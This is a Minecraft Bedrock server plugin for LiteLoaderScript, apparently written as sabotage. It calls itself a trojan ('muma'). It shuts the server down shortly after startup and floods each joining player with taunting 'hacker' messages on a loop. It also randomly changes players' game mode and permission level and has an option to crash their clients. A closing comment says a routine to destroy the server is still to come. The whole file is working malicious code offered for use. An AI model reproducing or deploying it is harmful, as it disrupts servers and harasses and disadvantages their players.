//LiteLoaderScript Dev Helper
/// <reference path="c:\Users\Administrator\.vscode/dts/HelperLib-master/src/index.d.ts"/>

//注册插件
ll.registerPlugin(
  /* name */ "muma",
  /* introduction */ "一个简用跑路的插件",
  /* version */ [0, 0, 1],
  /* otherInformation */ {}
);

// 插件是否加载成功
log("木马加载成功");

//配置文件
let conf = new JsonConfigFile("plugins/xianyubb/muma/config.json");
conf.init("设置关服时间", 60000);
conf.init("刷屏执行速度", 500);
conf.init("关服前的最后一句话", "再见了服务器");
conf.init("自定义内容1", "[§4§l黑客§r]§6垃圾服务器等死吧");
conf.init("自定义内容2", "[§4§l黑客§r]§560秒干趴你们服务器");
conf.init("自定义内容3", "[§4§l黑客§r]§3看我让你们体验一下什么叫做魔幻");
conf.init("自定义内容4", "[§4§l黑客§r]§2崩溃吧");
conf.init("是否开启客户端崩溃", false);

//自动关服
mc.listen("onServerStarted", () => {
  setTimeout(() => {
    mc.broadcast(conf.get("关服前的最后一句话"));
    mc.runcmd("stop");
  }, conf.get("设置关服时间")); //这里的数字可以更改，越小越快（单位：ms）
});

//向玩家发送虚假消息
let a = 0,
  b = 0; //声明ab变量,用作后面随机数
mc.listen("onJoin", (pl) => {
  setInterval(() => {
    a = Math.floor(Math.random() * 3);
    b = Math.floor(Math.random() * 2); //随机数
    pl.tell(conf.get("自定义内容1"));
    pl.tell(conf.get("自定义内容2"));
    pl.tell(conf.get("自定义内容3"));
    pl.tell(conf.get("自定义内容4"));
    pl.setGameMode(a);
    pl.setPermLevel(b);
    if (conf.get("是否开启客户端崩溃", Boolean) === 1) {
      pl.crash();
    }
  }, conf.get("刷屏执行速度"));
});

//破坏服务器（目前没想好怎么写哈哈）
